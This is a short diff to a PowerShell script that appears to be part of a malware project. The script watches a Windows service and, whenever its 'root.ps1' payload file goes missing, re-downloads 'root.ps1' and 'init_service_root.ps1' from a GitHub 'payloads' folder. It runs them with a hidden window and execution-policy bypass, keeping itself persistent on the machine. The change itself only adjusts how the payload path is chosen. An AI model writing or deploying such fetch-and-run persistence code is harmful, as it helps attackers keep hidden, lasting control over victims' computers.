@@ -9,10 +9,12 @@ $paths = @(
 
 $serviceName = "MyRootService" # change this to the name of the service
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
+$hasRootPathModified=$false
 if(($rootPath -eq $null) -or ($rootPath -eq "")){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $rootPath = $paths[$idx]
     $rootPath = "$rootPath\root.ps1"
+    $hasRootPathModified=$true
 }
 
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
@@ -47,8 +49,10 @@ while ($true) {
     $serv = Check-Service -name $serviceName
 
     if(-not(Test-Path -Path $rootPath -PathType Leaf)){
-        $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-        $rootPath = "$rootPath\root.ps1"
+        if(-not($hasRootPathModified)){
+            $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+            $rootPath = "$rootPath\root.ps1"
+        }
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
         powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath
